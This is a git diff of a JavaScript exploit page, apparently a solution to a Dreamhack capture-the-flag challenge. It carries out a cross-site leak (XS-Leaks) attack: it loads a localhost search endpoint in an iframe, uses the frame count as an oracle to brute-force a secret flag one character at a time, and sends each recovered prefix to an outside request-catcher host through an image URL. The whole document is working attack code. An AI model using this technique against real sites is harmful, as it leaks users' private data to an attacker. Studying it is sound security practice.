@@ -1,26 +1,53 @@
 <img id="img">
 <iframe id="iframe"></iframe>
 <script>
-    function search(query) {
+function search(query) {
+    return new Promise((resolve) => {
         const iframe = document.getElementById("iframe");
         iframe.src = `http://localhost:8000/search?query=${query}`;
 
         iframe.onload = () => {
-            return iframe.contentWindow.frames.length != 0;
+            try {
+                let result = iframe.contentWindow.frames.length;
+                resolve(result !== 0);
+            } catch (e) {
+                resolve(false);
+            }
         };
-    }
 
+        // 필요시 타임아웃 처리
+        setTimeout(() => {
+            resolve(false);
+        }, 2000);
+    });
+}
+
+async function exploit() {
     let chars = "0123456789abcdef}";
     let secret = "DH{";
     const img = document.getElementById("img");
 
+    // while 루프를 비동기로 처리
     while (!secret.includes("}")) {
+        let found = false;
+
+        // 0-f를 순차로 시도
         for (let c of chars) {
-            if (search(secret + c)) {
+            let success = await search(secret + c);
+            if (success) {
                 secret += c;
+                found = true;
                 img.src = `https://rxoulox.request.dreamhack.games/${secret}`;
                 break;
             }
         }
+
+        if (!found) {
+            img.src = `https://rxoulox.request.dreamhack.games/failed`;
+            break;
+        }
     }
+}
+
+exploit();
 </script>
